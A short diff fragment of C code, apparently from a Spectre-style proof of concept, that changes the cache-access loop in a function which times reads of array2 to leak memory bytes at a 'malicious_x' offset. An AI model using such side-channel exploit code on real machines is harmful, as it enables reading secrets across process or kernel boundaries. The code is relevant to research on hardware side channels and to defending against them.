@@ -99,12 +99,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 		}
-		for (j = 0; j < 10; j++)
-			for (i = 0; i < 256; i++)
-			{
-				addr = &array2[i];
-				junk = *addr;
-			}
+		for (i = 0; i < 256; i++)
+		{
+			addr = &array2[i];
+			junk = *addr;
+		}
 		PFC_TOC
 
 		/* Locate highest & second-highest results results tallies in j/k */
